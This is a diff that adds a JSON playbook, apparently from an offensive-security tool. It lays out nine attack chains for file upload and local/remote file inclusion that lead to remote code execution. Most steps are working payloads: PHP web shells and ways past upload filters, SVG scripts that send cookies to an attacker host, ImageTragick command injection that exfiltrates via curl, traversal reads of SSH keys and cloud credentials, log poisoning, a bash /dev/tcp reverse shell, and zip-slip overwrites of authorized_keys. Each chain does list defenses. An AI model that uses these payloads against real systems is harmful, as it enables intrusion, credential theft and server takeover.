@@ -1,0 +1,503 @@
+{
+  "domain": "File Upload",
+  "domainLabel": "File upload / LFI → RCE",
+  "domainOrder": 7,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "File upload to a PHP web shell",
+      "level": "newbie",
+      "impact": "Full RCE as the web user (www-data); a classic P1 depending on scope.",
+      "why": "The most reliable path from upload to shell; bypassing the blacklist and Content-Type check should be automatic.",
+      "precondition": "An upload field (avatar, attachment, import) that saves files to a web-accessible directory with PHP execution.",
+      "tags": [
+        "file-upload",
+        "webshell",
+        "rce",
+        "bypass"
+      ],
+      "realWorld": "PortSwigger Web Security Academy, File upload vulnerabilities labs; OWASP Unrestricted File Upload.",
+      "defense": "Server-side extension allowlist, image re-encoding, storing uploads outside the webroot and serving them through a non-executing handler.",
+      "steps": [
+        {
+          "title": "Find the upload and its directory",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://target/FUZZ -mc 200,301,403"
+        },
+        {
+          "title": "Simple web shell",
+          "kind": "note",
+          "detail": "shell.php = <?php system($_GET['cmd']); ?>"
+        },
+        {
+          "title": "Bypass the extension blacklist",
+          "kind": "note",
+          "detail": "shell.phtml | shell.php5 | shell.php7 | shell.phar | shell.pht"
+        },
+        {
+          "title": "Double extension and trailing characters",
+          "kind": "note",
+          "detail": "shell.php.jpg | shell.jpg.php | shell.php%00.jpg | shell.php. | shell.php::$DATA"
+        },
+        {
+          "title": "Content-Type spoofing",
+          "kind": "note",
+          "detail": "keep the .php name, set Content-Type: image/jpeg on the file part in Burp"
+        },
+        {
+          "title": "Magic-byte polyglot",
+          "kind": "note",
+          "detail": "GIF89a;<?php system($_GET['cmd']); ?> save as shell.php (bypasses getimagesize())"
+        },
+        {
+          "title": "Confirm RCE and persist",
+          "kind": "note",
+          "detail": "curl 'https://target/uploads/shell.php?cmd=id'; upgrade: weevely generate S3cret agent.php",
+          "success": "uid=33(www-data) in the response"
+        }
+      ]
+    },
+    {
+      "title": "The .htaccess / web.config upload trick",
+      "level": "intermediate",
+      "impact": "RCE on a server that only accepts 'images', by redefining which extensions get executed as code.",
+      "why": "Bypasses a strict extension allowlist when the config file itself is not blacklisted; a fallback when .phtml and friends do not get through.",
+      "precondition": "The upload lands in an Apache directory with AllowOverride All (or IIS), and the filter does not block .htaccess / web.config.",
+      "tags": [
+        "file-upload",
+        "htaccess",
+        "webconfig",
+        "rce"
+      ],
+      "realWorld": "HackTricks 'File Upload - .htaccess / web.config'; recurring HackerOne reports on avatar uploads.",
+      "defense": "Block dotfiles and *.config on upload, disable AllowOverride, keep uploads out of interpreter-mapped paths.",
+      "steps": [
+        {
+          "title": "Identify the web server",
+          "kind": "note",
+          "detail": "curl -I https://target  ->  check Server: (Apache / IIS / nginx)"
+        },
+        {
+          "title": "Apache: upload an override",
+          "kind": "note",
+          "detail": ".htaccess with the content: AddType application/x-httpd-php .l33t"
+        },
+        {
+          "title": "Upload a shell with the new extension",
+          "kind": "note",
+          "detail": "avatar.l33t = <?php system($_GET['cmd']); ?>  (passes the image allowlist)"
+        },
+        {
+          "title": "IIS variant",
+          "kind": "note",
+          "detail": "web.config with a <handlers>/<staticContent> block, or classic ASP <%= Response.Write(...) %>"
+        },
+        {
+          "title": "Note on nginx",
+          "kind": "note",
+          "detail": "no per-dir override; the trick will not work, pivot to traversal via the stored file name"
+        },
+        {
+          "title": "Trigger",
+          "kind": "note",
+          "detail": "curl 'https://target/uploads/avatar.l33t?cmd=id'",
+          "success": "uid=33(www-data)"
+        }
+      ]
+    },
+    {
+      "title": "SVG / HTML upload to stored XSS and account takeover",
+      "level": "newbie",
+      "impact": "Stored XSS in the victim's/admin's browser; session theft or an action as the admin leads to takeover.",
+      "why": "When code execution is not available, 'images' served inline as HTML/SVG yield stored XSS in the same origin.",
+      "precondition": "The application accepts SVG/HTML/XML and serves it inline on its own origin, not as a download attachment.",
+      "tags": [
+        "file-upload",
+        "svg",
+        "stored-xss",
+        "xxe"
+      ],
+      "realWorld": "Numerous HackerOne reports on stored XSS via SVG; PortSwigger notes on Content-Type and SVG.",
+      "defense": "Serve user files from a sandboxed origin with Content-Disposition: attachment and CSP, or sanitize SVG (DOMPurify) and strip scripts.",
+      "steps": [
+        {
+          "title": "Upload a PoC SVG",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "xss.svg = <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
+          "success": "alert with the application's domain"
+        },
+        {
+          "title": "SVG cookie theft",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('https://{LHOST}/c?'+document.cookie)</script></svg>"
+        },
+        {
+          "title": "HTML variant",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "poc.html with <script>document.location='https://{LHOST}/?'+document.cookie</script>"
+        },
+        {
+          "title": "Check inline serving",
+          "kind": "note",
+          "detail": "open the file URL: Content-Type: image/svg+xml and NO Content-Disposition: attachment"
+        },
+        {
+          "title": "Bonus: file read via SVG / XXE",
+          "kind": "payload",
+          "q": "XXE Injection",
+          "detail": "<image xlink:href=\"file:///etc/passwd\"/> or an XXE entity if the parser is XML-based"
+        },
+        {
+          "title": "Weaponize the attack",
+          "kind": "note",
+          "detail": "send the file link to an admin, hijack the session or trigger a state-changing endpoint as them"
+        }
+      ]
+    },
+    {
+      "title": "Malicious image to RCE (ImageTragick / ImageMagick)",
+      "level": "intermediate",
+      "impact": "Server-side RCE the moment your 'image' is processed / its preview is generated.",
+      "why": "Any application that runs uploads through ImageMagick/GraphicsMagick can be broken without a web shell, often blind via OOB.",
+      "precondition": "The upload is passed to ImageMagick convert/identify (resize, preview, avatar crop, PDF) on a version without a hardened policy.xml.",
+      "tags": [
+        "file-upload",
+        "imagemagick",
+        "imagetragick",
+        "rce",
+        "oob"
+      ],
+      "realWorld": "imagetragick.com (CVE-2016-3714); GhostScript CVE-2018-16509.",
+      "defense": "Update ImageMagick and lock down /etc/ImageMagick*/policy.xml for the MVG/MSL/URL/HTTPS/EPHEMERAL coders; verify the real image type before processing.",
+      "steps": [
+        {
+          "title": "Detect image processing",
+          "kind": "note",
+          "detail": "upload a normal JPG and notice resize/re-encoding  ->  there is a converter in the pipeline"
+        },
+        {
+          "title": "OOB activity probe",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "exploit.mvg: push graphic-context / fill 'url(https://{LHOST}/ping.jpg)' / pop graphic-context",
+          "success": "incoming request to {LHOST}"
+        },
+        {
+          "title": "Command injection (ImageTragick CVE-2016-3714)",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "fill 'url(https://127.0.0.1/x.jpg\"|curl https://{LHOST}/$(id|base64))' inside an MVG graphic-context"
+        },
+        {
+          "title": "Disguise as an image",
+          "kind": "note",
+          "detail": "save the MVG bytes as poc.png; ImageMagick picks the coder by content, not by extension"
+        },
+        {
+          "title": "Non-blind confirmation",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "...\"|id > /var/www/html/uploads/out.txt\" then curl https://target/uploads/out.txt",
+          "success": "uid=... in out.txt"
+        },
+        {
+          "title": "Pivot via GhostScript",
+          "kind": "note",
+          "detail": "if PDF/EPS is accepted, try the -dSAFER bypass (CVE-2018-16509) via a crafted .eps"
+        }
+      ]
+    },
+    {
+      "title": "Path Traversal: reading /etc/passwd, source code, and secrets",
+      "level": "newbie",
+      "impact": "Arbitrary file read: source code, .env, DB credentials, private keys, cloud tokens; often a direct path to full takeover.",
+      "why": "A basic read primitive that turns a minor bug into full compromise and forms the first half of most LFI -> RCE chains.",
+      "precondition": "A parameter that names a file: ?file= ?page= ?download= ?template= ?lang=, an image/attachment proxy.",
+      "tags": [
+        "path-traversal",
+        "lfi",
+        "file-read",
+        "secrets"
+      ],
+      "realWorld": "General technique; OWASP Path Traversal; ubiquitous ?file= findings during recon.",
+      "defense": "Canonicalize via realpath, check the base-directory prefix, reject ../ and null bytes.",
+      "steps": [
+        {
+          "title": "Find file parameters",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://target/index.php?FUZZ=../../../../etc/passwd' -mr 'root:x:0:0'"
+        },
+        {
+          "title": "Classic directory traversal",
+          "kind": "payload",
+          "q": "Directory Traversal",
+          "detail": "?file=../../../../../../etc/passwd",
+          "success": "root:x:0:0: in the response"
+        },
+        {
+          "title": "Bypass via encoding",
+          "kind": "payload",
+          "q": "Directory Traversal",
+          "detail": "%2e%2e%2f | double-encode %252e%252e%252f | overlong ..%c0%af"
+        },
+        {
+          "title": "Filter-strip bypass",
+          "kind": "payload",
+          "q": "Directory Traversal",
+          "detail": "....//....//....//etc/passwd  (bypasses naive ../ -> '' replacement)"
+        },
+        {
+          "title": "Null byte (old PHP < 5.3.4)",
+          "kind": "payload",
+          "q": "Directory Traversal",
+          "detail": "?file=../../../../etc/passwd%00.png"
+        },
+        {
+          "title": "Read source via the php filter",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "php://filter/convert.base64-encode/resource=index.php  then base64 -d"
+        },
+        {
+          "title": "Grab the real loot",
+          "kind": "checklist",
+          "q": "file-inclusion",
+          "detail": "/var/www/html/.env  config.php  /proc/self/cmdline  ~/.aws/credentials  ~/.ssh/id_rsa  /etc/nginx/sites-enabled/*"
+        }
+      ]
+    },
+    {
+      "title": "LFI to RCE via poisoning a readable file",
+      "level": "intermediate",
+      "impact": "Turns a read-only LFI into full RCE as www-data.",
+      "why": "The classic LFI escalation without an available upload: inject PHP into a file you already read, then include it.",
+      "precondition": "A confirmed LFI where included files are executed, plus a readable attacker-controlled file (a log, /proc, or a PHP session).",
+      "tags": [
+        "lfi",
+        "log-poisoning",
+        "proc-environ",
+        "php-session",
+        "rce"
+      ],
+      "realWorld": "HTB Poison / Beep; OWASP 'LFI + log poisoning'.",
+      "defense": "Never include() with a user-controlled path, set open_basedir, keep logs and sessions out of the inclusion scope.",
+      "steps": [
+        {
+          "title": "Confirm that include executes code",
+          "kind": "note",
+          "detail": "?page=../../../../etc/passwd works AND .php files are executed, not printed"
+        },
+        {
+          "title": "Find poisonable logs",
+          "kind": "checklist",
+          "q": "file-inclusion",
+          "detail": "/var/log/apache2/access.log  /var/log/nginx/access.log  /var/log/apache2/error.log"
+        },
+        {
+          "title": "Poison and include access.log",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "User-Agent header: <?php system($_GET['cmd']); ?>  then  ?page=../../../../var/log/apache2/access.log&cmd=id",
+          "success": "uid=... in the response"
+        },
+        {
+          "title": "/proc/self/environ variant",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "poison User-Agent, then ?page=../../../../proc/self/environ&cmd=id"
+        },
+        {
+          "title": "PHP session file variant",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "write <?php system($_GET['cmd']); ?> into a session field, then ?page=../../../../var/lib/php/sessions/sess_<PHPSESSID>&cmd=id"
+        },
+        {
+          "title": "SSH auth.log variant",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "ssh '<?php system($_GET[cmd]);?>'@target  then include /var/log/auth.log"
+        },
+        {
+          "title": "Confirm and pop a reverse shell",
+          "kind": "revshell",
+          "detail": "bash -c 'bash -i >& /dev/tcp/{LHOST}/4444 0>&1'"
+        }
+      ]
+    },
+    {
+      "title": "LFI to RCE via PHP wrappers (filter chain, data://, input, expect)",
+      "level": "intermediate",
+      "impact": "Full RCE from a pure file-read LFI with no upload and no writable log.",
+      "why": "A modern, near-universal LFI -> RCE against include/require/file_get_contents when poisoning and upload are impossible.",
+      "precondition": "The LFI sink is reachable via PHP stream wrappers (the value flows into a PHP file-read function).",
+      "tags": [
+        "lfi",
+        "php-wrappers",
+        "filter-chain",
+        "data-wrapper",
+        "rce"
+      ],
+      "realWorld": "Synacktiv 'PHP filter chains: file read to RCE'; HTB UpDown.",
+      "defense": "Disable allow_url_include, allowlist include targets, restrict PHP via disable_functions and open_basedir.",
+      "steps": [
+        {
+          "title": "Check php:// availability",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?file=php://filter/read=convert.base64-encode/resource=index.php  returns base64",
+          "success": "a base64 blob instead of a render"
+        },
+        {
+          "title": "Generate the filter chain",
+          "kind": "script",
+          "q": "php_filter_chain LFI→RCE (synacktiv reference, no upload)",
+          "detail": "python3 php_filter_chain_generator.py --chain '<?php system($_GET[\"cmd\"]); ?>'"
+        },
+        {
+          "title": "Run the chain (no file needed)",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "insert the long php://filter/convert.iconv.../resource=php://temp into ?file= and append &cmd=id"
+        },
+        {
+          "title": "data:// variant",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id  (requires allow_url_include=On)"
+        },
+        {
+          "title": "php://input variant",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?file=php://input  with POST body <?php system($_GET['cmd']); ?>  (requires allow_url_include=On)"
+        },
+        {
+          "title": "expect:// variant",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?file=expect://id  (only if the expect extension is loaded)"
+        },
+        {
+          "title": "Confirm",
+          "kind": "note",
+          "detail": "curl '...&cmd=id'",
+          "success": "uid=33(www-data)"
+        }
+      ]
+    },
+    {
+      "title": "Remote File Inclusion to a remote web shell",
+      "level": "newbie",
+      "impact": "Instant RCE by including code from your server (rarer on modern stacks).",
+      "why": "A textbook inclusion bug and a clear demonstration of why allow_url_include is dangerous.",
+      "precondition": "An inclusion sink plus allow_url_include=On and allow_url_fopen=On (typical of legacy PHP / misconfiguration).",
+      "tags": [
+        "rfi",
+        "remote-inclusion",
+        "webshell",
+        "rce"
+      ],
+      "realWorld": "General technique; OWASP RFI; old WordPress/Joomla plugin advisories.",
+      "defense": "Keep allow_url_include=Off (the default since PHP 5.2), do not build include paths from user input.",
+      "steps": [
+        {
+          "title": "Host the payload",
+          "kind": "note",
+          "detail": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.txt && python3 -m http.server 8000"
+        },
+        {
+          "title": "Include remotely",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?page=http://{LHOST}:8000/shell.txt&cmd=id",
+          "success": "uid=... in the response"
+        },
+        {
+          "title": "Bypass the appended extension",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?page=http://{LHOST}:8000/shell.txt%00  or  ?page=http://{LHOST}:8000/shell.txt?  (cuts off the forced .php)"
+        },
+        {
+          "title": "FTP / SMB fallbacks",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?page=ftp://{LHOST}/shell.txt  or  \\\\{LHOST}\\share\\shell.txt on Windows"
+        },
+        {
+          "title": "Confirm",
+          "kind": "note",
+          "detail": "curl 'https://target/index.php?page=http://{LHOST}:8000/shell.txt&cmd=id'"
+        },
+        {
+          "title": "Persist",
+          "kind": "note",
+          "detail": "include weevely agent.php remotely or system('curl -o /var/www/html/uploads/s.php https://{LHOST}/s.php')"
+        }
+      ]
+    },
+    {
+      "title": "Zip-Slip / symlink / archive extraction bypass",
+      "level": "intermediate",
+      "impact": "Writing a web shell into the webroot (or overwriting cron/authorized_keys) and reading arbitrary files via symlinks.",
+      "why": "Anywhere an application extracts an uploaded archive (import, plugin/theme, backup restore), a crafted entry name escapes the directory.",
+      "precondition": "An endpoint that extracts an uploaded .zip/.tar without sanitizing entry names.",
+      "tags": [
+        "zip-slip",
+        "symlink",
+        "archive",
+        "path-traversal",
+        "rce"
+      ],
+      "realWorld": "Snyk's 'Zip Slip' research (2018), which affected numerous archive libraries and CVEs.",
+      "defense": "Reject entry names with .. or absolute paths, canonicalize every destination path and verify it stays inside the target directory, forbid extracting symlinks.",
+      "steps": [
+        {
+          "title": "Find the extraction endpoint",
+          "kind": "note",
+          "detail": "import / restore-backup / install-plugin / 'upload archive'"
+        },
+        {
+          "title": "Build a zip-slip archive",
+          "kind": "note",
+          "detail": "python evilarc.py shell.php -o unix -d 8 -p var/www/html/uploads/"
+        },
+        {
+          "title": "Manual write variant",
+          "kind": "payload",
+          "q": "Zip Slip",
+          "detail": "python3 zipfile: write an entry named ../../../../var/www/html/uploads/shell.php"
+        },
+        {
+          "title": "Upload and extract",
+          "kind": "note",
+          "detail": "send evil.zip to the import endpoint and let the server extract it"
+        },
+        {
+          "title": "Confirm RCE",
+          "kind": "note",
+          "detail": "curl 'https://target/uploads/shell.php?cmd=id'",
+          "success": "uid=33(www-data)"
+        },
+        {
+          "title": "Symlink read variant",
+          "kind": "payload",
+          "q": "Zip Slip",
+          "detail": "ln -s /etc/passwd link; tar -cvf evil.tar link  (or zip --symlinks)  then read the extracted link"
+        },
+        {
+          "title": "Pivots via overwrite",
+          "kind": "checklist",
+          "q": "zip-slip",
+          "detail": "target ../../../../home/user/.ssh/authorized_keys  or  /etc/cron.d/x for code execution"
+        }
+      ]
+    }
+  ]
+}
